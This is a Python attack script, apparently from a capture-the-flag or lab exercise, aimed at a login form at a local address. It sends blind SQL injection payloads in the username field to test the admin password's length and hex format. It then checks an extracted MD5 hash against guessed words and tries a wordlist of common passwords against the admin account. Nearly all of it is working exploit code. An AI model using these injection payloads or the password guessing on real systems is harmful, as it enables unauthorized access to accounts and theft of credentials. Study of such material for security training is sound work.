import requests

TARGET_URL = "http://127.0.0.1:33038/index.php"

print("[*] Trying different SQLi approaches to get plain text output")

# Try UNION-based SQLi to see if we can get direct output
test_payloads = [
    # See if we can trigger error-based output
    ("' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))-- -", "conversion error"),
    # Try to get length
    ("' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32-- -", "password length is 32"),
    # Check if password could be numeric
    ("' AND (SELECT password FROM users WHERE username='admin') REGEXP '^[0-9a-f]+$'-- -", "is hex"),
]

print("[*] Testing additional conditions:")
for payload, desc in test_payloads:
    data = {
        "username": payload,
        "password": "test",
        "submit": "submit"
    }
    try:
        response = requests.post(TARGET_URL, data=data)
        result = "TRUE" if '"password"' in response.text else "FALSE"
        print(f"[*] {desc}: {result}")
    except Exception as e:
        print(f"[*] {desc}: ERROR - {e}")

# Let's try a wordlist of common payroll/admin passwords
print("\n[*] Attempting wordlist attack on login...")

common_passwords = [
    "admin", "password", "123456", "admin123", "password123",
    "letmein", "welcome", "qwerty", "payroll", "hradmin", 
    "Paybuddies", "paybuddies", "paybuddy", "PayBuddy",
    "hr2023", "hr2024", "login123", "secret", "p@ssw0rd",
    "P@ssw0rd", "Admin123", "changeme", "default",
    # MD5 password variants
    "7d39307ae824e70052c0aa16816a9b16",  # the hash itself
]

# Also try some hash-related passwords based on the extracted hash
test_hashes = [
    "admin", "password", "payroll", "paybuddies", "hr", "flag"
]

for pwd in test_hashes:
    md5_hash = __import__('hashlib').md5(pwd.encode()).hexdigest()
    if md5_hash == "7d39307ae824e70052c0aa16816a9b16":
        print(f"[+] CRACKED! Plain password is: {pwd}")
        break

# Try logging in with common passwords
print("\n[*] Testing common passwords...")
for pwd in common_passwords[:10]:
    data = {
        "username": "admin",
        "password": pwd,
        "submit": "submit"
    }
    response = requests.post(TARGET_URL, data=data)
    if '"Success"' in response.text:
        print(f"[+] SUCCESS! Password is: {pwd}")
        break
else:
    print("[!] No common passwords worked")

# Double check our SQLi extraction one more time - maybe login uses case-insensitive
